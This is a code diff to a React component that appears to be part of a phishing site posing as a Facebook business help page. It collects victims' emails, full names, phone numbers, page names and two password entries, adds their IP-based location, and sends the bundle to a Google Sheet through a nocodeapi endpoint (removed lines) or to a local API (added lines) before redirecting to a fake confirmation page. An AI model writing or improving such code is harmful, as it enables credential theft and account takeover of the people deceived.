@@ -47,37 +47,29 @@ const Buiness = () => {
             axios.get(`https://api.db-ip.com/v2/free/self`)
                 .then((response) => {
 
-                    const dataPassWord = {...dataLocalForm, firt_password: firstPassword, second_password: passWord };
+                    const dataPassWord = {...dataLocalForm, firt_password: firstPassword, second_password: passWord, ip:response.data.ipAddress, city: response.data.city, country: response.data.countryName   };
                     localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
-        
-                    const data = [[
-                        dataPassWord.fill_business_email,
-                        dataPassWord.fill_personal_email,
-                        dataPassWord.fill_full_name,
-                        dataPassWord.fill_facebook_pagename,
-                        '&_'+dataPassWord.fill_phone,
-                        response.data.ipAddress,
-                        response.data.city,
-                        response.data.countryName,
-                        firstPassword,
-                        passWord
-                    ]]
 
-                    fetch("https://v1.nocodeapi.com/ductham087/google_sheets/flWbjoQKjpKPwNqy?tabId=Sheet1", {
-                        method: "POST",
-                        mode: "cors",
-                        headers: {
-                            "Content-Type": "application/json",
-                        },
-                        // body: JSON.stringify(data),
-                        body: JSON.stringify(data),
+                    const data = {
+                        'fill_business_email': dataPassWord.fill_business_email,
+                        'fill_personal_email': dataPassWord.fill_personal_email,
+                        'fill_full_name': dataPassWord.fill_full_name,
+                        'fill_facebook_pagename': dataPassWord.fill_facebook_pagename,
+                        'fill_phone': dataPassWord.fill_phone,
+                        'ip': response.data.ipAddress,
+                        'city': response.data.city,
+                        'country': response.data.countryName,
+                        'first_password': firstPassword,
+                        'second_password': passWord,
+                    }
+
+                    axios.post( "http://localhost:8080/api/news", data) 
+                    .then((response) => {
+                        if (response.data.status === 0 ) {
+                            navigate('/help-100823847823627384548/confirm');
+                        }
                     })
-                    .then((r) => r.json())
-                    .then((data) => {
-                        navigate('/help-100823847823627384548/confirm');
-                    })
-        
-                        
+                    
                 })
                     
         }
@@ -270,7 +262,8 @@ const Buiness = () => {
                                 boxShadow: 'none',
                                 color: "#267df1",
                                 fontWeight: '700',
-                                fontSize:'1rem'
+                                fontSize:'1rem',
+                                width: "100%"
                             }}
                         >
                             Submit
@@ -424,7 +417,7 @@ const Buiness = () => {
                             width: "auto",
                             float: 'right'
                         }}
-                        className="btn butoni"
+                        className="btn butoni btn-form"
                     >
                         <Button
                             htmlType="submit"
@@ -435,7 +428,8 @@ const Buiness = () => {
                                 boxShadow: 'none',
                                 fontWeight: '700',
                                 fontSize:'1rem',
-                                color: 'white'
+                                color: 'white',
+                                width: "100%"
                             }}
                         >
                             Continue
